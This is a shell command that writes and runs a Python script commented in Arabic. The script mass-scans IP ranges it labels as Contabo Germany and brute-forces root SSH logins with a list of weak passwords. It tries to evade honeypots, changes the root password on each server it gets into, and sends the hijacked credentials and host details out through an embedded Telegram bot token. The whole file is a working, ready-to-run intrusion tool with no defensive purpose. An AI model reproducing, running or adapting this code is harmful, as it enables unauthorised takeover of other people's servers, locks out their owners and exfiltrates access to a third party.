cat > contabo_de_final.py << 'EOF'
#!/usr/bin/env python3
"""
CONTABO DE FINAL HUNTER - REAL VPS ONLY
Target: CONTABO, DE - Exact match like 178.18.250.183
System: Ubuntu 22.04.2 LTS | RAM: 7.8GB | CPU: 3x2400MHz
Credential: root:passw0rd!
"""

import socket, paramiko, threading, time, random, ipaddress, sys, logging, urllib.request, urllib.parse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

# ========== الإعدادات ==========
THREADS = 200
TIMEOUT_CONNECT = 0.8
TIMEOUT_SSH = 5
OUTPUT_FILE = "contabo_de_final.txt"
NEW_PASSWORD = "sinko@"
USER = "root"

# ========== كلمات المرور ==========
PASSWORDS = [
    "passw0rd!",           # الهدف الجديد
    "Hackers",             # من الاختراقات السابقة
    "Contabo2024",
    "contabo123",
    "123456",
    "password",
]

# ========== جميع نطاقات Contabo ألمانيا ==========
CONTABO_DE_RANGES = [
    "5.181.80.0/20", "5.189.128.0/17", "37.221.220.0/22", "79.143.128.0/18",
    "95.111.224.0/20", "95.111.240.0/20", "144.76.0.0/16", "194.31.0.0/16",
    "213.136.64.0/19", "213.136.96.0/19", "213.136.0.0/16", "178.18.250.0/24",
    "5.9.0.0/16", "148.251.0.0/16", "168.119.0.0/16", "176.9.0.0/16",
    "49.12.0.0/16", "135.181.0.0/16", "136.243.0.0/16", "138.201.0.0/16",
    "159.69.0.0/16", "167.235.0.0/16", "185.181.0.0/16", "193.31.0.0/16", "195.201.0.0/16",
]

CONTABO_RANGES = list(set(CONTABO_DE_RANGES))
NETWORKS = []
for r in CONTABO_RANGES:
    try:
        NETWORKS.append(ipaddress.ip_network(r, strict=False))
    except:
        pass

print(f"[✓] Loaded {len(NETWORKS)} Contabo Germany networks")

# ========== تلغرام ==========
TELEGRAM_TOKEN = "8624305523:AAG5j_J6BXJA9JCcDabTdxLC14Jkv8YCamA"
TELEGRAM_CHAT_ID = "7619431226"

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"}).encode()
        urllib.request.urlopen(url, data=data, timeout=3)
    except:
        pass

# ========== إحصائيات ==========
stats = {"scanned": 0, "honeypots": 0, "success": 0, "start_time": time.time()}
lock = threading.Lock()
stop_flag = threading.Event()

GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RED = '\033[91m'
RESET = '\033[0m'

# ========== فتح المنفذ ==========
def is_port_open(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect_ex((ip, 22))
        sock.close()
        return True
    except:
        return False

# ========== فحص زمن الاستجابة ==========
def check_response_time(ip):
    try:
        start = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((ip, 22))
        sock.close()
        elapsed = time.time() - start
        return elapsed >= 0.08, round(elapsed, 3)
    except:
        return False, 0

# ========== فحص بانر SSH ==========
def check_banner(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, 22))
        banner = sock.recv(1024).decode().lower()
        sock.close()
        honeypot_words = ["honeypot", "cowrie", "kippo", "dionaea", "honeyd", "sandbox", "fake"]
        for w in honeypot_words:
            if w in banner:
                return False
        return len(banner) >= 30
    except:
        return False

# ========== فحص البورتات ==========
def check_ports(ip):
    open_ports = 0
    for port in [22, 80, 443, 8080, 21, 25]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.4)
            if sock.connect_ex((ip, port)) == 0:
                open_ports += 1
            sock.close()
        except:
            pass
    return open_ports <= 2

# ========== فحص الحاوية ==========
def is_container(ssh_client):
    try:
        stdin, stdout, _ = ssh_client.exec_command("ls /.dockerenv 2>/dev/null", timeout=2)
        if stdout.read().decode().strip():
            return True
        stdin, stdout, _ = ssh_client.exec_command("cat /proc/1/cgroup | grep -E 'docker|lxc'", timeout=2)
        if stdout.read().decode().strip():
            return True
        return False
    except:
        return False

# ========== جلب معلومات النظام ==========
def get_system_info(ssh_client):
    info = {
        "system": "Unknown", "apt": "Unknown", "cpu_speed": "0",
        "cpu_count": "0", "memory": "0", "hostname": "Unknown"
    }
    try:
        stdin, stdout, _ = ssh_client.exec_command("hostname", timeout=2)
        out = stdout.read().decode().strip()
        if out:
            info["hostname"] = out
        
        stdin, stdout, _ = ssh_client.exec_command("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"'", timeout=3)
        out = stdout.read().decode().strip()
        if out:
            info["system"] = out
        
        stdin, stdout, _ = ssh_client.exec_command("which apt", timeout=2)
        out = stdout.read().decode().strip()
        if out:
            info["apt"] = out
        
        stdin, stdout, _ = ssh_client.exec_command("nproc", timeout=2)
        out = stdout.read().decode().strip()
        if out:
            info["cpu_count"] = out
        
        stdin, stdout, _ = ssh_client.exec_command("grep -m1 'cpu MHz' /proc/cpuinfo | awk '{print $4}'", timeout=2)
        out = stdout.read().decode().strip()
        if out:
            try:
                info["cpu_speed"] = f"{float(out):.3f}"
            except:
                info["cpu_speed"] = out
        
        stdin, stdout, _ = ssh_client.exec_command("free -m | awk '/^Mem:/ {print $2}'", timeout=2)
        out = stdout.read().decode().strip()
        if out and out.isdigit():
            info["memory"] = str(round(int(out) / 1024, 1))
    except:
        pass
    return info

# ========== التحقق من مطابقة النظام لـ 178.18.250.183 ==========
def is_exact_match(info):
    # نظام Ubuntu 22.04
    if "Ubuntu 22.04" not in info["system"]:
        return False, f"OS: {info['system'][:40]}"
    
    # الرام ~7.8GB
    try:
        ram = float(info["memory"])
        if ram < 7.0 or ram > 8.5:
            return False, f"RAM: {ram}GB (expected 7.8)"
    except:
        return False, f"RAM: {info['memory']}"
    
    # 3 أنوية
    if info["cpu_count"] != "3":
        return False, f"CPU cores: {info['cpu_count']} (expected 3)"
    
    # سرعة المعالج ~2400MHz
    try:
        speed = float(info["cpu_speed"])
        if speed < 2000 or speed > 2800:
            return False, f"CPU speed: {speed}MHz (expected 2400)"
    except:
        pass
    
    # APT في المسار الصحيح
    if info["apt"] != "/usr/bin/apt":
        return False, f"APT: {info['apt']}"
    
    return True, "OK"

# ========== تغيير كلمة المرور ==========
def change_password(ssh_client):
    try:
        ssh_client.exec_command(f'echo "root:{NEW_PASSWORD}" | chpasswd', timeout=5)
        return True
    except:
        return False

# ========== الهجوم الرئيسي ==========
def attack_contabo(ip, password):
    if stop_flag.is_set():
        return False
    
    if not is_port_open(ip):
        with lock:
            stats["scanned"] += 1
        return False
    
    # طبقة 1: زمن الاستجابة
    time_ok, rt = check_response_time(ip)
    if not time_ok:
        with lock:
            stats["honeypots"] += 1
        print(f"{RED}[HONEYPOT] {ip} -> response {rt}s{RESET}")
        return False
    
    # طبقة 2: فحص البانر
    if not check_banner(ip):
        with lock:
            stats["honeypots"] += 1
        print(f"{RED}[HONEYPOT] {ip} -> bad banner{RESET}")
        return False
    
    # طبقة 3: فحص البورتات
    if not check_ports(ip):
        with lock:
            stats["honeypots"] += 1
        print(f"{RED}[HONEYPOT] {ip} -> too many ports{RESET}")
        return False
    
    ssh_client = None
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(ip, username=USER, password=password, timeout=TIMEOUT_SSH,
                          allow_agent=False, look_for_keys=False)
        
        # طبقة 4: فحص الحاوية
        if is_container(ssh_client):
            with lock:
                stats["honeypots"] += 1
            print(f"{RED}[HONEYPOT] {ip} -> container detected{RESET}")
            ssh_client.close()
            return False
        
        # جلب معلومات النظام
        info = get_system_info(ssh_client)
        
        # طبقة 5: التحقق من المطابقة التامة
        is_match, reason = is_exact_match(info)
        if not is_match:
            with lock:
                stats["honeypots"] += 1
            print(f"{YELLOW}[REJECTED] {ip} -> {reason}{RESET}")
            ssh_client.close()
            return False
        
        # تغيير كلمة المرور
        change_password(ssh_client)
        
        with lock:
            stats["success"] += 1
        
        # طباعة النتيجة بنفس تنسيق الهدف
        print(f"""
{GREEN}{'='*65}{RESET}
{GREEN}[✓] CONTABO REAL VPS HACKED!{RESET}
{CYAN}{ip}:22 | {USER} | {password}  | Details : {{TEST
System :  {info['system']}
Apt : {info['apt']}
Cpu speed : {info['cpu_speed']}
Cpu count : {info['cpu_count']}
Memory : {info['memory']}Gi}}{RESET}
{GREEN}{'='*65}{RESET}""")
        
        # حفظ في الملف
        with open(OUTPUT_FILE, "a") as f:
            f.write(f"{ip}:22 | {USER} | {password}  | Details : {{TEST\n")
            f.write(f"System :  {info['system']}\n")
            f.write(f"Apt : {info['apt']}\n")
            f.write(f"Cpu speed : {info['cpu_speed']}\n")
            f.write(f"Cpu count : {info['cpu_count']}\n")
            f.write(f"Memory : {info['memory']}Gi}}\n")
            f.write(f"New password: {NEW_PASSWORD}\n{'='*65}\n")
        
        # إرسال إلى تلغرام
        msg = (f"✅✅✅ <b>CONTABO REAL VPS HACKED!</b> ✅✅✅\n\n"
               f"<code>{ip}:22 | {USER} | {password}  | Details : {{TEST\n"
               f"System :  {info['system']}\n"
               f"Apt : {info['apt']}\n"
               f"Cpu speed : {info['cpu_speed']}\n"
               f"Cpu count : {info['cpu_count']}\n"
               f"Memory : {info['memory']}Gi}}</code>\n\n"
               f"🔐 <b>New password: {NEW_PASSWORD}</b>")
        
        send_telegram(msg)
        ssh_client.close()
        return True
        
    except Exception as e:
        return False
    finally:
        if ssh_client:
            ssh_client.close()
        with lock:
            stats["scanned"] += 1

# ========== فحص IP واحد ==========
def scan_ip(ip):
    for pwd in PASSWORDS:
        if attack_contabo(ip, pwd):
            return True
    return False

# ========== توليد IP عشوائي ==========
def random_ip():
    net = random.choice(NETWORKS)
    if net.prefixlen <= 16:
        parts = str(net.network_address).split('.')
        a, b = parts[0], parts[1] if len(parts) > 1 else "0"
        return f"{a}.{b}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    offset = random.randint(1, net.num_addresses - 2)
    return str(net.network_address + offset)

# ========== عرض الإحصائيات ==========
def print_stats():
    elapsed = time.time() - stats["start_time"]
    with lock:
        sys.stdout.write(f"\r{YELLOW}[📊] Scanned: {stats['scanned']:,} | Honeypots: {stats['honeypots']} | ✅: {stats['success']} | {elapsed:.0f}s{RESET}")
        sys.stdout.flush()

# ========== الرئيسي ==========
def main():
    send_telegram(f"🚀 <b>CONTABO DE FINAL HUNTER STARTED</b>\n🎯 Target: Contabo Germany (Ubuntu 22.04|7.8GB|3x2400MHz)\n🔑 Credentials: {USER}:passw0rd!\n🛡️ Anti-Honeypot: 5 layers\n🔐 New password: {NEW_PASSWORD}")
    
    print(f"{GREEN}{'='*65}{RESET}")
    print(f"{GREEN}[✓] CONTABO DE FINAL HUNTER - REAL VPS ONLY{RESET}")
    print(f"{CYAN}📌 Target: EXACTLY like 178.18.250.183{RESET}")
    print(f"{CYAN}   • System: Ubuntu 22.04.2 LTS{RESET}")
    print(f"{CYAN}   • RAM: 7.8Gi{RESET}")
    print(f"{CYAN}   • CPU: 3 cores @ 2400.000 MHz{RESET}")
    print(f"{CYAN}   • APT: /usr/bin/apt{RESET}")
    print(f"{CYAN}📌 Networks: {len(NETWORKS)} subnets{RESET}")
    print(f"{CYAN}🛡️ Anti-Honeypot: response time | banner | ports | container | exact match{RESET}")
    print(f"{CYAN}🔐 New password: {NEW_PASSWORD}{RESET}")
    print(f"{GREEN}{'='*65}{RESET}\n")
    
    try:
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            while not stop_flag.is_set():
                ip = random_ip()
                executor.submit(scan_ip, ip)
                print_stats()
                time.sleep(0.01)
    except KeyboardInterrupt:
        stop_flag.set()
    
    print(f"\n{GREEN}{'='*65}{RESET}")
    print(f"{GREEN}[✓] SCAN FINISHED{RESET}")
    print(f"✅ Real VPS hacked: {stats['success']}")
    print(f"🚫 Honeypots avoided: {stats['honeypots']}")
    print(f"📊 IPs scanned: {stats['scanned']:,}")
    print(f"📁 Results: {OUTPUT_FILE}")
    print(f"{GREEN}{'='*65}{RESET}")
    
    send_telegram(f"🏁 SCAN FINISHED\n✅ Hacked: {stats['success']}\n🚫 Honeypots: {stats['honeypots']}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_flag.set()
EOF

python3 contabo_de_final.py
